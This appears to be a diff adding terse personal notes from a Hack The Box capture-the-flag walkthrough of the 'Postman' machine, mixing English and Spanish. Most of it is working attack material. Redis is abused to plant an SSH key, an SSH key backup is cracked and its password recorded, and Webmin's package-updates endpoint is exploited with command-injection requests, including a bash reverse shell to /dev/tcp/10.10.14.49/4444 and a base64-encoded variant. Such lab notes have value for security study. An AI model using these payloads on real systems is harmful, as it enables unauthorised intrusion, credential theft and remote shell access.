@@ -1,0 +1,109 @@
+nmap -v -sC -sV -oA 
+nmap -p- -oA
+http://10.10.10.160/index.php o index.html, view code, burp(target tree)
+gobuster -u http://10.10.10.160 -w medium.txt -o gobuster_postman
+searchsploit //MiniServ
+/etc/hosts
+	10.10.10.160	postman
+https://postman:1000	//view certificate(before accepting insecure site, not the burp cert)
+Webmin	//parece que no hay nada
+wget 'http://postman/upload/Cyber-security-web-banner.jpg' 	//after going to /upload, the one who stands out is this banner
+exiftool banner.jpg	//is different the one with wget and a simple browser image download, better wget
+wget 10.10.10.160	//to validate date of creation/modif
+exiftool index.html
+/upload.php upload.html robots.txt
+nc -v 10.10.10.160 6379
+//google:redis print info https://redis.io/commands/info
+INFO	//dentro de nc
+config_file:/etc/redis/redis.conf
+CONFIG GET *
+//google:redis upload webshell https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
+nmap --script redis-info -sV -p 6379 10.10.10.160
+//google:ubuntu 4.15.0-58-generic x86_64 2019  -> release august 2019 
+apt-get install redis-tools
+redis-cli -h 10.10.10.160
+CONFIG GET *
+keys *
+
+mkdir keys	//kali
+cd keys
+ssh-keygen
+ssh-keygen -f postman
+vim postman.pub		//add 2 line breaks before and after the file
+
+cat postman.pub | redis-cli -h 10.10.10.160 -x set crackit
+
+config set dir /var/lib/redis/.ssh	//redis-cli
+config set dbfilename "authorized_keys"
+save
+
+ssh -i postman redis@10.10.10.160
+find . -writable
+
+cd /opt/privilege-escalation-awesome-scripts-suite/linPEAS/	//kali
+python -m SimpleHTTPServer
+
+cd /dev/shm	//redis
+wget 10.10.14.49:8000/linpeas.sh
+./linpeas.sh
+find / -newermt 2019-09-10 ! -newermt 2019-09-13 -ls 2>/dev/null	//mientras corre linpeas
+./LinEnum.sh	//hacer lo mismo con linenum				//mientras corre linenum
+find / 2>/dev/null |grep  -i webmin > /dev/shm/webin.log
+grep -v '/usr/share' webin.log
+ls /tmp/.webmin			//n/a
+cat /webmin-setup.out		//n/a
+vim LinEnum.sh
+	thorough=1
+./LinEnum.sh
+cd /opt/
+ls -lan id_rsa.bak
+stat id_rsa.bak		//then copy the key, to local machin to crack it
+/opt/JohnTheRipper/run/ssh2john.py postman.ssh > postman.john.ssh
+password computer2008
+vim matt	//pegamos id_rsa.bak en matt
+chmod 600 matt
+ssh -i matt Matt@10.10.10.160	//n/a
+
+
+//google:ssh login no profile https://askubuntu.com/questions/63741/can-i-ssh-into-my-account-without-invoking-profile
+ssh -t -i matt Matt@10.10.10.160 "bash --noprofile"	//not working
+redis@Postman:~$ su - Matt	//login as Matt
+cat /etc/ssh/sshd_config	//deny user Matt, thats why it does not work to ssh to Matt
+//can login to webmin with Matt:computer2008
+searchsploit webmin
+msfdb run 
+search webmin
+//try webmin_backdoor did not work
+//try webmin_packageup_rce got root
+set rhost, lhost, username, password
+set SSL true
+
+
+//EXTRA!! Analizar exploit
+//setup burp
+set Proxies http://127.0.0.1:8080
+set ReverseAllowProxy true
+run
+
+//in update packages button in webmin POST /package-updates/update.cgi 
+tcpdump -i tun0 -n icmp		//listen on kali
+mode=acl%2Fapt&search=&u=+|+ping+10.10.14.49&ok_top=Update+Selected+Packages	//burp
+
+POST /package-updates/update.cgi HTTP/1.1
+Host: postman:10000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Cookie: sid=a9f709adc678bc6cbf4d19df0e941c3b
+Referer: https://postman:10000/package-updates/?xnavigation=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 82
+Connection: close
+
+u=acl%2Fapt&u=+|+bash+-c+"{ping,-c,1,10.10.14.49}"&ok_top=Update+Selected+Packages
+
+u=acl%2Fapt&u=+|+bash+-c+"{bash,-i,>&,/dev/tcp/10.10.14.49/4444,0>&1}"&ok_top=Update+Selected+Packages	//needs to encode base 64
+
+echo -n 'bash -i >& /dev/tcp/10.10.14.49/4444 0>&1' |base64 	//kali
+
+u=acl%2Fapt&u=+|+bash+-c+"{echo,-n,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC40OS80NDQ0IDA%2bJjE%3d}|{base64,-d}|{bash,-i}"&ok_top=Update+Selected+Packages	//for pipes must use curly brackets, base64 has to be urlencoded (no '+' nor '='). The ',' are spaces 
+
+
